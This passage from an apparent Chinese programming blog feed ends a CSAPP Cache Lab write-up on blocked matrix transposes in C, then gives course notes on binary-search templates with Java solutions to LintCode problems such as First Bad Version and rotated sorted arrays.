class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;</span><br><span class="line">    <span class="keyword">int</span> n = N / <span class="number">8</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> m = M / <span class="number">8</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            tmp0 = A[i][j];</span><br><span class="line">            tmp1 = A[i][j+<span class="number">1</span>];</span><br><span class="line">            tmp2 = A[i][j+<span class="number">2</span>];</span><br><span class="line">            tmp3 = A[i][j+<span class="number">3</span>];</span><br><span class="line">            tmp4 = A[i][j+<span class="number">4</span>];</span><br><span class="line">            tmp5 = A[i][j+<span class="number">5</span>];</span><br><span class="line">            tmp6 = A[i][j+<span class="number">6</span>];</span><br><span class="line">            tmp7 = A[i][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">            B[j+<span class="number">1</span>][i] = tmp1;</span><br><span class="line">            B[j+<span class="number">2</span>][i] = tmp2;</span><br><span class="line">            B[j+<span class="number">3</span>][i] = tmp3;</span><br><span class="line">            B[j+<span class="number">4</span>][i] = tmp4;</span><br><span class="line">            B[j+<span class="number">5</span>][i] = tmp5;</span><br><span class="line">            B[j+<span class="number">6</span>][i] = tmp6;</span><br><span class="line">            B[j+<span class="number">7</span>][i] = tmp7;</span><br><span class="line"></span><br><span class="line">        &#125;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 分块后，剩余部分的处理</span></span><br><span class="line">    <span class="keyword">for</span>(i = n;i &lt; N;i++)</span><br><span class="line">        <span class="keyword">for</span>(j = m;j &lt; M;j++)&#123;</span><br><span class="line">            tmp0 = A[i][j];</span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">        <span class="keyword">for</span>(j = m;j &lt; M;j++)&#123;</span><br><span class="line">            tmp0 = A[i][j];</span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = n;i &lt; N;i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; M;j++)&#123; </span><br><span class="line">            tmp0 = A[i][j];</span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         287</span><br><span class="line">Trans perf 64x64           0.0         8        4611</span><br><span class="line">Trans perf 61x67          10.0        10        1905</span><br></pre></td></tr></table></figure></p>
<p>很奇怪的64*64一直是0分</p>
<h2 id="Version4"><a href="#Version4" class="headerlink" title="Version4"></a>Version4</h2><p>对于64 x 64的矩阵，类似与对32 x 32的分析，每行占用8个set，则第5行就会和第1行冲突，那是否可以将block设置为<code>4*4</code>的大小呢？ 尝试了一下发现能优化到1795次miss，但是距离1300次miss的差距还是比较大。因为4*4的block我们实际上只用了读取的8个数组中的一半，没有充分利用cache的特性。</p>
<p>所以我们结合这两种思想，还按原来8 x 8的方式来处理，但是在每一个8 x 8 的矩阵中再次进行分块，先处理左上角4 x 4，再右上、右下、左下。（注意这里是一个顺时针的形状, 而不是我们常见的Z字型，是因为右上和左下的空间局部性最低，容易产生更多的miss conflict， 所以采用了这种处理方式）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit_version4</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, ii, j, tmp0, tmp1, tmp2, tmp3;</span><br><span class="line">    <span class="keyword">int</span> n = N / <span class="number">8</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> m = M / <span class="number">8</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="comment">//左上</span></span><br><span class="line">            <span class="keyword">for</span> (ii = <span class="number">0</span>; ii &lt; <span class="number">4</span>; ii++) &#123;</span><br><span class="line">                tmp0 = A[i + ii][j];</span><br><span class="line">                tmp1 = A[i + ii][j + <span class="number">1</span>];</span><br><span class="line">                tmp2 = A[i + ii][j + <span class="number">2</span>];</span><br><span class="line">                tmp3 = A[i + ii][j + <span class="number">3</span>];</span><br><span class="line">                B[j][i + ii] = tmp0;</span><br><span class="line">                B[j + <span class="number">1</span>][i + ii] = tmp1;</span><br><span class="line">                B[j + <span class="number">2</span>][i + ii] = tmp2;</span><br><span class="line">                B[j + <span class="number">3</span>][i + ii] = tmp3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 右上</span></span><br><span class="line">            <span class="keyword">for</span> (ii = <span class="number">0</span>; ii &lt; <span class="number">4</span>; ii++) &#123;</span><br><span class="line">                tmp0 = A[i + ii][j + <span class="number">4</span>];</span><br><span class="line">                tmp1 = A[i + ii][j + <span class="number">4</span> + <span class="number">1</span>];</span><br><span class="line">                tmp2 = A[i + ii][j + <span class="number">4</span> + <span class="number">2</span>];</span><br><span class="line">                tmp3 = A[i + ii][j + <span class="number">4</span> + <span class="number">3</span>];</span><br><span class="line">                B[j + <span class="number">4</span>][i + ii] = tmp0;</span><br><span class="line">                B[j + <span class="number">4</span> + <span class="number">1</span>][i + ii] = tmp1;</span><br><span class="line">                B[j + <span class="number">4</span> + <span class="number">2</span>][i + ii] = tmp2;</span><br><span class="line">                B[j + <span class="number">4</span> + <span class="number">3</span>][i + ii] = tmp3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 右下</span></span><br><span class="line">            <span class="keyword">for</span> (ii = <span class="number">4</span>; ii &lt; <span class="number">8</span>; ii++) &#123;</span><br><span class="line">                tmp0 = A[i + ii][j + <span class="number">4</span>];</span><br><span class="line">                tmp1 = A[i + ii][j + <span class="number">4</span> + <span class="number">1</span>];</span><br><span class="line">                tmp2 = A[i + ii][j + <span class="number">4</span> + <span class="number">2</span>];</span><br><span class="line">                tmp3 = A[i + ii][j + <span class="number">4</span> + <span class="number">3</span>];</span><br><span class="line">                B[j + <span class="number">4</span>][i + ii] = tmp0;</span><br><span class="line">                B[j + <span class="number">4</span> + <span class="number">1</span>][i + ii] = tmp1;</span><br><span class="line">                B[j + <span class="number">4</span> + <span class="number">2</span>][i + ii] = tmp2;</span><br><span class="line">                B[j + <span class="number">4</span> + <span class="number">3</span>][i + ii] = tmp3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 左下</span></span><br><span class="line">            <span class="keyword">for</span> (ii = <span class="number">4</span>; ii &lt; <span class="number">8</span>; ii++) &#123;</span><br><span class="line">                tmp0 = A[i + ii][j];</span><br><span class="line">                tmp1 = A[i + ii][j + <span class="number">1</span>];</span><br><span class="line">                tmp2 = A[i + ii][j + <span class="number">2</span>];</span><br><span class="line">                tmp3 = A[i + ii][j + <span class="number">3</span>];</span><br><span class="line">                B[j][i + ii] = tmp0;</span><br><span class="line">                B[j + <span class="number">1</span>][i + ii] = tmp1;</span><br><span class="line">                B[j + <span class="number">2</span>][i + ii] = tmp2;</span><br><span class="line">                B[j + <span class="number">3</span>][i + ii] = tmp3;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 处理剩余区域</span></span><br><span class="line">    <span class="keyword">for</span> (i = n; i &lt; N; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = m; j &lt; M; j++) &#123;</span><br><span class="line">            tmp0 = A[i][j];</span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = m; j &lt; M; j++) &#123;</span><br><span class="line">            tmp0 = A[i][j];</span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = n; i &lt; N; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">            tmp0 = A[i][j];</span><br><span class="line">            B[j][i] = tmp0;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>至此 算是得到了一个比较好的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         287</span><br><span class="line">Trans perf 64x64           6.3         8        1451</span><br><span class="line">Trans perf 61x67          10.0        10        1905</span><br><span class="line">          Total points    51.3        53</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>刚拿到这个题的时候卡在malloc上了很久，后面Part B一开始也搞不清楚blocking方法为什么会减少miss，差点就直接上网搜实验的答案了。后来在别人的博客上看到一句话，又让我坚定下自己把这个实验扣下来的决心。 送给大家共勉。</p>
<blockquote>
<p>谁不想用最简单的方法获得最强大的能力，但是这又怎么可能。捷径，如果指的是最短的路径，那么也就是梯度上升最快的路径，更是最难的路径。靠什么去走完这段旅程呢？靠自己。靠自己的思考。靠自己的百折不挠。</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[九章-二分法]]></title>
      <url>/2018/02/23/Algorithms/%E4%B9%9D%E7%AB%A0-%E4%BA%8C%E5%88%86%E6%B3%95/</url>
      <content type="html"><![CDATA[<blockquote>
<p>趁着大四的寒假比较闲报了一个九章算法班补一补算法。这是第二节课，主讲二分法。</p>
</blockquote>
<h2 id="Time-complexity-in-coding-interview"><a href="#Time-complexity-in-coding-interview" class="headerlink" title="Time complexity in coding interview"></a>Time complexity in coding interview</h2><table>
<thead>
<tr>
<th>时间复杂度</th>
<th>算法</th>
</tr>
</thead>
<tbody>
<tr>
<td>O($1$)</td>
<td>极少</td>
</tr>
<tr>
<td>O($logn$)</td>
<td>几乎都是二分法</td>
</tr>
<tr>
<td>O($sqrt(n)$)</td>
<td>几乎都是分解质因数</td>
</tr>
<tr>
<td>O($n$)</td>
<td>高频</td>
</tr>
<tr>
<td>O($nlogn$)</td>
<td>一般需要排序</td>
</tr>
<tr>
<td>O($n^2$)</td>
<td>数组、枚举、动态规划</td>
</tr>
<tr>
<td>O($n^3$)</td>
<td>数组、枚举、动态规划</td>
</tr>
<tr>
<td>O($2^n$)</td>
<td>与组合有关的搜索</td>
</tr>
<tr>
<td>O($n!$)</td>
<td>与排列有关的搜索</td>
</tr>
</tbody>
</table>
<p>通过O(1)时间把规模为n的问题变成n/2的问题，时间复杂度为O(log(n))<br>通过O(n)时间把规模为n的问题变成n/2的问题，时间复杂度为O(n)</p>
<a id="more"></a>
<h2 id="二分法模板"><a href="#二分法模板" class="headerlink" title="二分法模板"></a>二分法模板</h2><p>例题: <a href="http://www.lintcode.com/problem/classical-binary-search/" target="_blank" rel="noopener">Binary Search</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findPosition</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, end = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(start &lt; end)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)&#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)&#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">			<span class="comment">// or start = mid;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            end = mid - <span class="number">1</span>;</span><br><span class="line">			<span class="comment">// or end = mid;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nums[start] == target)&#123;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[end] == target)&#123;</span><br><span class="line">        <span class="keyword">return</span> end;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有几个需要注意的地方</p>
<ol>
<li>while条件是<code>start + 1 &lt; end</code> 这是为了防止进入死循环，例如[1,1]查找1</li>
<li><code>start + (end - start) / 2</code>来计算中点，防止start+end溢出</li>
<li><code>nums[mid] == target</code>的情况可以不做判断，因为<strong>二分的目的只是为了缩小区间，没有必要在搜索的过程中找到解</strong></li>
<li>循环结束后检查<code>nums[start]</code> 和 <code>nums[end]</code>是否满足条件，如果都不满足则说明搜索失败</li>
</ol>
<p>类似的题目还有</p>
<p><a href="http://www.lintcode.com/en/problem/first-position-of-target/" target="_blank" rel="noopener">First Position of Target</a><br><a href="http://www.lintcode.com/en/problem/last-position-of-target/" target="_blank" rel="noopener">Last Position of Target</a></p>
<h2 id="境界一-二分位置"><a href="#境界一-二分位置" class="headerlink" title="境界一: 二分位置"></a>境界一: 二分位置</h2><p>这种题目一般会给一个数组，让我们找数组中第一个或者最后一个满足条件的位置。即可以把数组转化成OOOOO…OOXX..XXX  我们要找的就是最后一个O或者第一个X</p>
<h3 id="例题一-First-Bad-Version"><a href="#例题一-First-Bad-Version" class="headerlink" title="例题一: First Bad Version"></a>例题一: First Bad Version</h3><p><a href="http://www.lintcode.com/problem/first-bad-version/" target="_blank" rel="noopener">First Bad Version</a><br>这道题就是典型的OOXX问题，一共有n个git版本号，其中从某个版本号开始变成BadVersion，要我们找第一个BadVersion是哪个版本。所以我们可以将这个问题看成，所有好的版本都是O，坏的版本都是X，我们要找的就是长度为n的数组中第一个X的位置。<br>解法就是计算中点mid是否为badVersion，如果是则说明mid属于X，那么将end赋值为mid，否则说明mid属于O，则将start赋值为mid+1。这样不断缩小区间，直到start 和 end只相差1</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findFirstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">1</span>, end = n;</span><br><span class="line">    <span class="keyword">while</span>(start + <span class="number">1</span> &lt; end)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(SVNRepo.isBadVersion(mid))&#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            start = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(SVNRepo.isBadVersion(start))&#123;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(SVNRepo.isBadVersion(end))&#123;</span><br><span class="line">        <span class="keyword">return</span> end;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="例题二-Find-Minimum-in-Rotated-Sorted-Array"><a href="#例题二-Find-Minimum-in-Rotated-Sorted-Array" class="headerlink" title="例题二: Find Minimum in Rotated Sorted Array"></a>例题二: Find Minimum in Rotated Sorted Array</h3><p><a href="http://www.lintcode.com/zh-cn/problem/find-minimum-in-rotated-sorted-array/" target="_blank" rel="noopener">Find Minimum in Rotated Sorted Array</a><br>寻找旋转排序数组（类似[4,5,6,7,0,1,2,3]）的最小值。这道题我们也可以通过与nums[0]比大小来把数组变换成OOXXX的形式，所有<code>&lt;=nums[0]</code>的位置为X，<code>&gt;nums[0]</code>的问题为O，查找第一个X。所以只要在模板的基础上稍加修改即可<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> start = <span class="number">0</span>, end = nums.length - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> target = nums[end];</span><br><span class="line">	<span class="keyword">while</span>(start + <span class="number">1</span> &lt; end)&#123;</span><br><span class="line">		<span class="keyword">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(nums[mid] &lt;= target)&#123; end = mid; &#125;</span><br><span class="line">		<span class="keyword">else</span>&#123; start = mid;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Math.min(nums[start], nums[end]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>其实还可以以nums[0]作为标尺来把数组变成OOXXX，但是需要注意的是一个特殊情况。如果输入的nums恰好是已经排序好的, [1,2,3,4,5,6,7]如果我们拿nums[0]做标尺，所有的数字都是O，而当我们检测到mid是O的时候就会把start赋值为mid, 故区间会不断向右，直到缩小到最右边得到最大值。 但是如果我们拿nums[end]做标尺，就会把所有数字都判断成O，区间会向右缩小，最后会得到数组的最小值。 所以对于这道题应该使用nums[end]作为target，如果要找最大值则使用nums[0]</p>
</blockquote>
<p>Follow Up 如果有重复元素怎么办？ <a href="http://www.lintcode.com/zh-cn/problem/find-minimum-in-rotated-sorted-array-ii/" target="_blank" rel="noopener">Find Minimum in Rotated Sorted Array-ii</a><br>有重复元素的时候最坏的时间复杂度是O(n)，因为如果对于[1,1,1,1,-1,1,1,1]这样的数组，我们无法在O(logn)时间内找到最小的解。这道题的解法其实只用在基础上加上去重的部分, 这里还需要注意的是没有target了，nums[end]在搜索过程是不断变化的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, end = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(start + <span class="number">1</span> &lt; end)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">		<span class="comment">// 每次要更新区间的时候都把尾部的重复元素去掉</span></span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == nums[end])&#123;   </span><br><span class="line">            end --;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; nums[end])&#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            start = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Math.min(nums[end], nums[start]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Related-Problems"><a href="#Related-Problems" class="headerlink" title="Related Problems"></a>Related Problems</h3><p><a href="http://www.lintcode.com/en/problem/maximum-number-in-mountain-sequence/" target="_blank" rel="noopener">http://www.lintcode.com/en/problem/maximum-number-in-mountain-sequence/</a><br>这道题则是根据元素是上升还是下降的属性来把数组变成OOOOXXXX<br><a href="http://www.lintcode.com/en/problem/smallest-rectangle-enclosing-black-pixels/" target="_blank" rel="noopener">http://www.lintcode.com/en/problem/smallest-rectangle-enclosing-black-pixels/</a></p>
<h2 id="境界二-保留一半"><a href="#境界二-保留一半" class="headerlink" title="境界二: 保留一半"></a>境界二: 保留一半</h2><p>对于无法找到一个条件形成OOXX的模型的题目，可以根据判断保留下有解的一半或者无解的一半。 其实二分法的实质也是在<strong>不断的缩小问题的范围</strong></p>
<h3 id="例题一-Find-Peak-Element"><a href="#例题一-Find-Peak-Element" class="headerlink" title="例题一: Find Peak Element"></a>例题一: Find Peak Element</h3><p><a href="http://www.lintcode.com/problem/find-peak-element/" target="_blank" rel="noopener">Find Peak Element</a><br>这道题数组中的数字满足两个条件</p>
<ul>
<li>相邻数字不相等</li>
<li>A[0] &lt; A[1] &amp;&amp; A[end - 2] &gt; A[end - 1]<br>需要我们找到满足<code>A[p] &gt; A[p - 1] &amp;&amp; A[p] &gt; A[p+1]</code>的位置P</li>
</ul>
<p>我们观察这个数组满足的条件，A[0] &lt; A[1]说明数组最开始是递增的，A[end-2] &gt; A[end - 1]说明数组最后的递减的。又因为相邻的数字不相等，所以肯定存在一个peak使得数组从递增变成了递减。</p>
<p>明白了这个问题之后想要如何使用二分法呢。首先我们还是要计算mid，计算完mid之后要判断mid这个位置是处于递增还是递减。递增的的mid和递减的end中肯定存在一个peak，所以我们把区间缩小为[mid, end]，而递减的mid和递增的start中一定存在一个peak，故把区间缩小为[start, mid]。用这样的方法可以不断缩小我们的区间切保证区间内存在一个peak。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findPeak</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(A == <span class="keyword">null</span> || A.length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, end = A.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(start + <span class="number">1</span> &lt; end)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(A[mid - <span class="number">1</span>] &lt; A[mid])&#123;</span><br><span class="line">            start = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(A[mid - <span class="number">1</span>] &gt; A[mid])&#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A[start] &gt; A[end] ? start : end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Follow Up 如果在一个二维数组中寻找Peak怎么办? <a href="http://www.lintcode.com/en/problem/find-peak-element-ii/" target="_blank" rel="noopener">http://www.lintcode.com/en/problem/find-peak-element-ii/</a></p>
<h3 id="例题二-Search-in-Rotated-Sorted-Array"><a href="#例题二-Search-in-Rotated-Sorted-Array" class="headerlink" title="例题二: Search in Rotated Sorted Array"></a>例题二: Search in Rotated Sorted Array</h3><p><a href="http://www.lintcode.com/problem/search-in-rotated-sorted-array/" target="_blank" rel="noopener">Search in Rotated Sorted Array</a><br>在旋转排序数组中寻找某一个值。首先要明确我们一次二分的目的就是为了缩小搜索的区间，那我们还是先写出二分法的模板。<strong>在计算出mid的值之后如何确定下一步的搜索区间是关键</strong>。与前面Find MInimum In Rotated Sorted Array题类似。计算nums[mid]之后和target比较。这里我们还需要判断mid是处于左边区间还是右边区间，如果mid处在左边区间，那<code>nums[mid] &gt;= target &amp;&amp; target &gt;= nums[start]</code> 对于下一步的区间为[start, mid] ,反之对应于[mid, end]; 如果mid处于右区间判断方法同理。</p>
